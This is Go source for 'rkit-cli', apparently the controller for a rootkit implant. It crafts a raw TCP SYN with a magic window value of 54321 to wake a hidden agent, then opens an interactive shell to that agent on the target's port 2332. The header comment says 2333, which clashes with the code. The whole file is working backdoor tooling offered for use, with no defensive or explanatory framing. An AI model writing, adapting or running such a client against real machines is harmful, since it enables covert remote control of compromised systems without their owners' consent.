// rkit-cli: sends magic TCP window packet (54321) to target, then connects to port 2333 for a shell.
package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"time"

	"golang.org/x/sys/unix"
)

const (
	magicWindow = 54321
	agentPort   = 2332
)

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "Usage: %s <target_ip>\n", os.Args[0])
		os.Exit(1)
	}
	targetIP := os.Args[1]

	if runtime.GOOS == "linux" {
		if err := sendMagicPacket(targetIP); err != nil {
			fmt.Fprintf(os.Stderr, "Magic packet: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Magic packet sent to %s\n", targetIP)
		time.Sleep(100 * time.Millisecond)
	} else {
		fmt.Printf("Skipping magic packet (raw sockets need Linux). Connecting to %s:%d ...\n", targetIP, agentPort)
	}

	if err := interactWithAgent(targetIP); err != nil {
		fmt.Fprintf(os.Stderr, "%v\n", err)
		os.Exit(1)
	}
}

// sendMagicPacket sends a raw TCP SYN with window=54321 to open the knock window on the agent.
func sendMagicPacket(dstIP string) error {
	ip := net.ParseIP(dstIP)
	if ip == nil || ip.To4() == nil {
		return fmt.Errorf("invalid IPv4: %s", dstIP)
	}
	dst := ip.To4()

	// IP header (20 bytes) + TCP header (20 bytes)
	ipHdr := make([]byte, 20)
	tcpHdr := make([]byte, 20)

	// IP header
	ipHdr[0] = 0x45             // version 4, ihl 5
	ipHdr[1] = 0                // tos
	binary.BigEndian.PutUint16(ipHdr[2:4], 40) // total length
	binary.BigEndian.PutUint16(ipHdr[4:6], uint16(seed()&0xFFFF))
	ipHdr[6] = 0
	ipHdr[7] = 0  // frag_off
	ipHdr[8] = 64 // ttl
	ipHdr[9] = 6  // protocol TCP
	// check at 10:12 (fill later)
	copy(ipHdr[12:16], net.IPv4zero.To4()) // saddr 0 (kernel fills on Linux)
	copy(ipHdr[16:20], dst)

	binary.BigEndian.PutUint16(ipHdr[10:12], ipChecksum(ipHdr))

	// TCP header
	sport := uint16(12345 + seed()%1000)
	binary.BigEndian.PutUint16(tcpHdr[0:2], sport)
	binary.BigEndian.PutUint16(tcpHdr[2:4], agentPort) // same as connect so both pass firewall
	binary.BigEndian.PutUint32(tcpHdr[4:8], uint32(seed())) // seq
	binary.BigEndian.PutUint32(tcpHdr[8:12], 0)             // ack_seq
	tcpHdr[12] = 0x50 // doff 5 (<<4), res1 0
	tcpHdr[13] = 0x02 // SYN
	binary.BigEndian.PutUint16(tcpHdr[14:16], magicWindow)
	// check at 16:18 (fill with pseudo-header)
	binary.BigEndian.PutUint16(tcpHdr[18:20], 0) // urg_ptr

	// TCP checksum over pseudo-header + TCP
	psh := make([]byte, 12+20)
	binary.BigEndian.PutUint32(psh[0:4], 0)
	binary.BigEndian.PutUint32(psh[4:8], binary.BigEndian.Uint32(dst))
	psh[8] = 0
	psh[9] = 6
	binary.BigEndian.PutUint16(psh[10:12], 20)
	copy(psh[12:], tcpHdr)
	binary.BigEndian.PutUint16(tcpHdr[16:18], tcpChecksum(psh))

	packet := append(ipHdr, tcpHdr...)

	fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
	if err != nil {
		return err
	}
	defer unix.Close(fd)

	// Linux: IP_HDRINCL so kernel doesn't add another IP header
	if err := unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1); err != nil {
		return err
	}

	addr := unix.SockaddrInet4{Port: agentPort, Addr: [4]byte{dst[0], dst[1], dst[2], dst[3]}}
	if err := unix.Sendto(fd, packet, 0, &addr); err != nil {
		return err
	}
	return nil
}

func ipChecksum(b []byte) uint16 {
	var sum uint32
	for i := 0; i < len(b); i += 2 {
		if i+1 < len(b) {
			sum += uint32(b[i])<<8 | uint32(b[i+1])
		} else {
			sum += uint32(b[i]) << 8
		}
	}
	for sum > 0xffff {
		sum = sum>>16 + sum&0xffff
	}
	return ^uint16(sum)
}

func tcpChecksum(b []byte) uint16 {
	var sum uint32
	for i := 0; i < len(b); i += 2 {
		if i+1 < len(b) {
			sum += uint32(b[i])<<8 | uint32(b[i+1])
		} else {
			sum += uint32(b[i]) << 8
		}
	}
	for sum > 0xffff {
		sum = sum>>16 + sum&0xffff
	}
	return ^uint16(sum)
}

var seedState uint32

func seed() int {
	if seedState == 0 {
		seedState = uint32(time.Now().UnixNano() & 0x7fffffff)
	}
	seedState = seedState*1103515245 + 12345
	return int(seedState & 0x7fffffff)
}

func interactWithAgent(targetIP string) error {
	addr := fmt.Sprintf("%s:%d", targetIP, agentPort)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("connect to %s: %w", addr, err)
	}
	defer conn.Close()

	fmt.Printf("Connected to agent shell on %s\n", addr)
	fmt.Println("Type commands (exit to quit)")

	go io.Copy(os.Stdout, conn)
	_, _ = io.Copy(conn, os.Stdin)
	return nil
}
